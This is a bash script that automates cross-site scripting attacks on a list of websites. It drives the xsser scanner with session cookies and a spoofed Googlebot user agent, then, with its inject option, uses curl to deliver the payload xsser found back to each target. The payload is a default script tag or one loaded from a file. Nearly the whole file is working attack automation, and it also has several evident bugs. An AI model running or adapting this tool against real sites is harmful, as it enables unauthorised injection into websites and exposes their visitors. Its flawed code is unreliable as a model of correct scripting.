#!/usr/bin/env bash
set -euo pipefail

SCRIPT_PATH="$( cd "$(dirname "$0")" >/dev/null 2>&1 ; pwd -P )"

PAYLOAD_FILE_PATH="${SCRIPT_PATH}/payload.txt"
SITES_URLS_FILE_PATH="${SCRIPT_PATH}/sites-urls.txt"
RESULTS_PATH="${SCRIPT_PATH}/results"

DEFAULT_PAYLOAD="<script>alert(1)</script>"

PAYLOAD_FILE_CONTENT=$( [[ -f "${PAYLOAD_FILE_PATH}" ]] && cat "${PAYLOAD_FILE_PATH}" || echo "")
PAYLOAD="${PAYLOAD_FILE_CONTENT:-$DEFAULT_PAYLOAD}"

INJECT=false
SCAN=false

read_list() {
    ARRAY=( $( echo "${1}" ) )
    echo "${ARRAY[@]}"
}

print_list() {
    echo "${1[@]}"
}

read_site_urls_list(){
    DEFAULT_SITES_URLS_LIST=$(read_list "${DEFAULT_SITES_URLS}")
    [[ -z "${1}" ]] && echo "${DEFAULT_SITES_URLS_LIST}" && exit 0
    [[ -f "${1}" ]] && read_list "$(cat "${1}")" || echo "${DEFAULT_SITES_URLS_LIST}" && exit 0
}

print_info() {
    echo ""
    echo "----- PAYLOAD ----- "
    echo "$PAYLOAD"
    echo ""
}

inject_payload() {
    echo "----- INJECTING PAYLOAD -----"
    REPORT_FILE=${1}
    MODE=${2}
    RAW_OUTPUT=$(grep "CONGRATULATIONS" -A 40 "${REPORT_FILE}")

    echo $MODE
    FINAL_ATTACK=$(echo "$RAW_OUTPUT" | grep 'Final Attack' | awk '{print $4}')

    if [[ $MODE == *"POST"* ]]; then
        echo "POST"
        URL=$(echo "$RAW_OUTPUT" | grep "Target" | awk '{print $3}')
        curl -X POST \
         "${URL}" \
        -b "${COOKIE}" \
        --data "${FINAL_ATTACK}"
    fi

    if [[ $MODE == *"GET"* ]]; then
        echo "POST"
        URL=$(echo "$RAW_OUTPUT" | grep "Target" | awk '{print $3}')
        curl -X GET \
         "${FINAL_ATTACK}" \
        -b "${COOKIE}"
    fi
}


calculate_hash() {
    FILE_PATH="${1}"
    MD5=$(md5sum "${FILE_PATH}" | awk '{print $1}')
    echo "${MD5}"
}

scan_vulns(){
    SCAN_MODE="${1:-""}"
    URL="${2:-""}"
    ENDPOINT="${3:-""}"
    COOKIE="${4:-""}"

    [ -z "$URL" ] && exit 0

    echo "----- SCANNING -----"
    echo "Url: ${URL}"
    [[ -n "${ENDPOINT}" ]] && echo "Endpoint: ${ENDPOINT}"

    [[ -z "${ENDPOINT}" ]] && SCAN_MODE="DEFAULT"

    ATTACK_MODE_INPUT=""

    case $SCAN_MODE in

        "GET")
            ATTACK_MODE_INPUT="-u ${URL} -g ${ENDPOINT}"
            ;;

        "POST")
            ATTACK_MODE_INPUT="-u ${URL} -p ${ENDPOINT}"
            ;;

        "AUTO")
            ATTACK_MODE_INPUT="--auto -u ${URL}${ENDPOINT}"
            ;;

        "ALL")
            ATTACK_MODE_INPUT="--all ${URL}${ENDPOINT}"
            ;;
        *)
            ATTACK_MODE_INPUT="--all ${URL}${ENDPOINT}"
            ;;
    esac

    SITE=$(echo "$URL" | sed -e 's|^[^/]*//||' -e 's|/.*$||')

    REPORT_FILE="$RESULTS_PATH/${SITE}.raw"

    xsser $ATTACK_MODE_INPUT \
        -s \
        -v \
        --user-agent "Googlebot/2.1 (+http://www.google.com/bot.html)" \
        --threads "$(nproc --all)" \
        --timeout 30 \
        --retries 1 \
        --delay 0 \
        --Fp="${PAYLOAD}" \
        --cookie="${COOKIE}" \
        > "${REPORT_FILE}"

    MD5=$(calculate_hash "${REPORT_FILE}")
    FINAL_REPORT="${REPORT_FILE%.raw}-${MD5}.raw"
    mv "${REPORT_FILE}" "${FINAL_REPORT}"

    if [[ "${INJECT}" = "true" ]]; then
        inject_payload "${FINAL_REPORT}" "${SCAN_MODE}"
    fi
}

usage() {
    echo "Usages: " 1>&2; exit 1;
}

remote_control() {
    print_info

    while read -r TARGET; do
        if  [[ "${TARGET}"  != \#* ]] ; then
            PARAMS=$(echo "${TARGET}" | xargs)

            if [[ "${SCAN}" = "true" ]]; then
                scan_vulns $PARAMS
            fi

            if [[ "${SCAN}" = "false" && "${INJECT}" = "true" ]]; then
                for REPORT_FILE in ${RESULTS_PATH}; do
                    [ -e "${REPORT_FILE}" ] || continue
                    inject_payload "${REPORT_FILE}" "GETPOST"
                    done
            fi
        fi
        done < "${SITES_URLS_FILE_PATH}"
}

while getopts "sip:" OPTION; do

    case "${OPTION}" in
            s)
                SCAN=true
                ;;
            i)
                INJECT=true
                ;;
            p)
                PAYLOAD=$(cat "${OPTARG}")
                ;;
            *)
                usage
                ;;
        esac
    done
shift $((OPTIND-1))

remote_control
